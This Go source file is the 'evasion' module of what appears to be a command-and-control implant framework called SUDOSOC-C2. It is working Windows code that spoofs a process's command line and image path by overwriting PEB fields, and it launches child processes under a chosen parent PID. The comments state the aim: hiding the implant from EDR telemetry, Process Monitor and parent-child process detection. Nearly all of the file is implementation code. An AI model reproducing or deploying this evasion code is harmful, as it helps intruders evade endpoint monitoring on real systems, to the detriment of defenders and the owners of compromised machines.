package evasion

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// Process Argument Spoofing (PEB CommandLine overwrite).
//
// Tools like Process Monitor, Process Hacker, and most EDR telemetry
// pipelines read a process's command-line arguments by calling
// NtQueryInformationProcess(ProcessBasicInformation) and following
// the pointer chain:
//
//   PEB → ProcessParameters → CommandLine (UNICODE_STRING)
//
// Both the Length and the Buffer pointer of that UNICODE_STRING live in
// user-mode memory that we own — we can overwrite them freely.
//
// Technique:
//   1. Call RtlGetCurrentPeb() to get our own PEB address.
//   2. Follow PEB→ProcessParameters (offset 0x20 on x64).
//   3. Write a fake UTF-16 command-line string into a heap allocation.
//   4. Point CommandLine.Buffer at the new allocation and update Length.
//
// After this call, any tool reading our command line via the PEB will see
// the fake arguments. The real arguments are still in the original buffer
// (we save a pointer to them) so we can restore if needed.
//
// Parent PID Spoofing (bonus, same file):
//   When creating a child process, we set PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
//   in the STARTUPINFOEX to make the child appear as a child of any chosen
//   parent (e.g. explorer.exe). This hides the implant's process tree from
//   tools that detect "suspicious parent → child" relationships
//   (e.g. cmd.exe spawned by svchost.exe looks odd; cmd.exe spawned by
//   explorer.exe looks normal).

import (
	"fmt"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// Windows API procs not yet exported by golang.org/x/sys/windows.
var (
	modKernel32Spoof = windows.NewLazySystemDLL("kernel32.dll")
	procGetProcessHeap              = modKernel32Spoof.NewProc("GetProcessHeap")
	procHeapAlloc                   = modKernel32Spoof.NewProc("HeapAlloc")
	procInitializeProcThreadAttrList = modKernel32Spoof.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttr        = modKernel32Spoof.NewProc("UpdateProcThreadAttribute")
	procDeleteProcThreadAttrList    = modKernel32Spoof.NewProc("DeleteProcThreadAttributeList")
)

func getProcessHeap() uintptr {
	r, _, _ := procGetProcessHeap.Call()
	return r
}

func heapAlloc(heap, flags, size uintptr) uintptr {
	r, _, _ := procHeapAlloc.Call(heap, flags, size)
	return r
}

// rtlUserProcessParameters64 maps the _RTL_USER_PROCESS_PARAMETERS
// structure on x64 Windows. We only declare the fields we access so the
// size doesn't need to be exact — we use byte offsets for the critical ones.
//
// Offsets verified against Windows 10 22H2 / Windows 11 23H2 public symbols.
const (
	// Offset of CommandLine (UNICODE_STRING) inside RTL_USER_PROCESS_PARAMETERS.
	// UNICODE_STRING = { USHORT Length, USHORT MaximumLength, PWSTR Buffer }
	// = 4 + 4(pad) + 8 = 16 bytes total on x64.
	cmdLineLenOff = 0x70  // USHORT Length
	cmdLineBufOff = 0x78  // PWSTR  Buffer
)

// SpoofCommandLine replaces the command-line string visible in the PEB with
// fakeArgs. Returns the original buffer pointer so the caller can restore it.
// Pass the returned pointer to RestoreCommandLine when done.
func SpoofCommandLine(fakeArgs string) (origBuf uintptr, err error) {
	peb := windows.RtlGetCurrentPeb()
	if peb == nil {
		return 0, fmt.Errorf("RtlGetCurrentPeb returned nil")
	}

	// PEB.ProcessParameters is at offset 0x20 on x64.
	ppAddr := *(*uintptr)(unsafe.Pointer(uintptr(unsafe.Pointer(peb)) + 0x20))
	if ppAddr == 0 {
		return 0, fmt.Errorf("ProcessParameters pointer is nil")
	}

	// Read the existing CommandLine buffer pointer so we can restore it.
	origBufPtr := (*uintptr)(unsafe.Pointer(ppAddr + cmdLineBufOff))
	origBuf = *origBufPtr

	// Encode the fake string as UTF-16.
	fakeUTF16, err := windows.UTF16FromString(fakeArgs)
	if err != nil {
		return 0, fmt.Errorf("UTF16FromString: %w", err)
	}
	fakeBytes := len(fakeUTF16) * 2

	// Allocate a new buffer for the fake string. We use HeapAlloc so it
	// lives in normal process heap and doesn't look like shellcode.
	heap := getProcessHeap()
	newBuf := heapAlloc(heap, 0, uintptr(fakeBytes))
	if newBuf == 0 {
		return 0, fmt.Errorf("HeapAlloc failed")
	}

	// Copy the UTF-16 bytes into the new buffer.
	dst := unsafe.Slice((*uint16)(unsafe.Pointer(newBuf)), len(fakeUTF16))
	copy(dst, fakeUTF16)

	// Patch CommandLine.Length and CommandLine.Buffer.
	// The UNICODE_STRING.Length field counts bytes (not characters) and does
	// NOT include the NUL terminator. We subtract 2 for the NUL.
	lenPtr := (*uint16)(unsafe.Pointer(ppAddr + cmdLineLenOff))
	*lenPtr = uint16(fakeBytes - 2)
	*origBufPtr = newBuf

	// {{if .Config.Debug}}
	log.Printf("[argspoof] CommandLine spoofed → %q (orig @ 0x%x)", fakeArgs, origBuf)
	// {{end}}
	return origBuf, nil
}

// RestoreCommandLine reverses SpoofCommandLine by writing origBuf back into
// the PEB ProcessParameters CommandLine.Buffer field.
func RestoreCommandLine(origBuf uintptr) {
	peb := windows.RtlGetCurrentPeb()
	if peb == nil {
		return
	}
	ppAddr := *(*uintptr)(unsafe.Pointer(uintptr(unsafe.Pointer(peb)) + 0x20))
	if ppAddr == 0 {
		return
	}
	origBufPtr := (*uintptr)(unsafe.Pointer(ppAddr + cmdLineBufOff))
	*origBufPtr = origBuf
	// {{if .Config.Debug}}
	log.Printf("[argspoof] CommandLine restored to 0x%x", origBuf)
	// {{end}}
}

// SpoofImagePathName replaces the ImagePathName in the PEB with fakePath,
// making the process appear to have a different executable path.
// The binary that shows in Task Manager / Process Hacker comes from here.
func SpoofImagePathName(fakePath string) error {
	peb := windows.RtlGetCurrentPeb()
	if peb == nil {
		return fmt.Errorf("RtlGetCurrentPeb returned nil")
	}
	ppAddr := *(*uintptr)(unsafe.Pointer(uintptr(unsafe.Pointer(peb)) + 0x20))
	if ppAddr == 0 {
		return fmt.Errorf("ProcessParameters is nil")
	}

	// ImagePathName is at offset 0x60 on x64 (just before CommandLine at 0x70).
	const imagePathLenOff = 0x60
	const imagePathBufOff = 0x68

	fakeUTF16, err := windows.UTF16FromString(fakePath)
	if err != nil {
		return err
	}
	fakeBytes := len(fakeUTF16) * 2

	heap := getProcessHeap()
	newBuf := heapAlloc(heap, 0, uintptr(fakeBytes))
	if newBuf == 0 {
		return fmt.Errorf("HeapAlloc failed")
	}
	dst := unsafe.Slice((*uint16)(unsafe.Pointer(newBuf)), len(fakeUTF16))
	copy(dst, fakeUTF16)

	lenPtr := (*uint16)(unsafe.Pointer(ppAddr + imagePathLenOff))
	bufPtr := (*uintptr)(unsafe.Pointer(ppAddr + imagePathBufOff))
	*lenPtr = uint16(fakeBytes - 2)
	*bufPtr = newBuf

	// {{if .Config.Debug}}
	log.Printf("[argspoof] ImagePathName spoofed → %q", fakePath)
	// {{end}}
	return nil
}

// ─────────────────────────────────────────────────────────────────────────────
// Parent PID Spoofing
// ─────────────────────────────────────────────────────────────────────────────

// SpawnWithSpoofedParent launches executable at exePath with the given args,
// making it appear as a child of the process with parentPID.
//
// Common choices for parentPID:
//   explorer.exe  — makes any child look like a user-launched app
//   svchost.exe   — blends into background services
//   winlogon.exe  — high-privilege parent, rarely spawns children so use sparingly
//
// The function returns the PID of the spawned process.
func SpawnWithSpoofedParent(exePath, args string, parentPID uint32) (uint32, error) {
	parentHandle, err := windows.OpenProcess(
		windows.PROCESS_CREATE_PROCESS, false, parentPID)
	if err != nil {
		return 0, fmt.Errorf("OpenProcess(parent=%d): %w", parentPID, err)
	}
	defer windows.CloseHandle(parentHandle)

	// Allocate and initialise a PROC_THREAD_ATTRIBUTE_LIST with one entry.
	var attrListSize uintptr
	procInitializeProcThreadAttrList.Call(0, 1, 0, uintptr(unsafe.Pointer(&attrListSize)))

	attrListBuf := make([]byte, attrListSize)
	attrList := uintptr(unsafe.Pointer(&attrListBuf[0]))

	r, _, _ := procInitializeProcThreadAttrList.Call(attrList, 1, 0, uintptr(unsafe.Pointer(&attrListSize)))
	if r == 0 {
		return 0, fmt.Errorf("InitializeProcThreadAttributeList failed")
	}
	defer procDeleteProcThreadAttrList.Call(attrList)

	// PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
	const attrParentProcess = 0x00020000
	r, _, _ = procUpdateProcThreadAttr.Call(
		attrList, 0, attrParentProcess,
		uintptr(unsafe.Pointer(&parentHandle)),
		unsafe.Sizeof(parentHandle),
		0, 0,
	)
	if r == 0 {
		return 0, fmt.Errorf("UpdateProcThreadAttribute failed")
	}

	cmdLine, _ := windows.UTF16PtrFromString(exePath + " " + args)
	si := windows.StartupInfoEx{
		StartupInfo: windows.StartupInfo{
			Cb: uint32(unsafe.Sizeof(windows.StartupInfoEx{})),
		},
		ProcThreadAttributeList: (*windows.ProcThreadAttributeList)(unsafe.Pointer(attrList)),
	}

	const createExtendedStartupInfo = 0x00080000
	var pi windows.ProcessInformation
	if err := windows.CreateProcess(
		nil, cmdLine, nil, nil, false,
		windows.CREATE_NO_WINDOW|createExtendedStartupInfo,
		nil, nil,
		&si.StartupInfo, &pi,
	); err != nil {
		return 0, fmt.Errorf("CreateProcess: %w", err)
	}
	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)

	// {{if .Config.Debug}}
	log.Printf("[argspoof] spawned PID %d as child of PID %d", pi.ProcessId, parentPID)
	// {{end}}
	return pi.ProcessId, nil
}
